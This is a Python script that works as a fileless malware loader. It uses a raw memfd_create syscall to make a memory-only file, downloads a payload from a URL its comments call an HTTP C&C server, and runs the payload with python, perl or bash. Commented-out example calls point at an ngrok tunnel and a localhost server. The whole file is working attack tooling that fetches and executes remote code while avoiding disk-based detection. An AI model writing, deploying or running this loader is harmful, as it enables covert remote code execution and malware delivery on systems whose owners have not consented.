#! /usr/bin/python3

import ctypes
import ctypes.util
import os
import time
import subprocess
import urllib.request 

# URL = HTTP server which contains the payload
# lang = Language of payload (Python, perl, bash)
def send_payload(url, lang):
    libc = ctypes.cdll.LoadLibrary(ctypes.util.find_library('c'))
    # Create the memfd call
    memfd = libc.syscall(319,b'aqeeb', 1)
    assert memfd >= 0
    pid = os.getpid()
    print("Process PID", pid)
    print(memfd)
    # Contact the HTTP C&C and pull in the data in byte format.
    response = urllib.request.urlopen(url).read()

    # Write to the memfd file which is a regular file, just memory resident.
    with open("/proc/{}/fd/{}".format(pid, memfd), mode='wb') as payload:
        payload.write(response)

    # Execute the memfd file using python3, or whatever language you write it in.
    os.system('{} /proc/{}/fd/{}'.format(lang, pid, memfd))

#send_payload('https://3ddc-86-20-220-165.ngrok.io/scanner.py')
#send_payload('http://127.0.0.1:8080/scanner.py', 'python3')
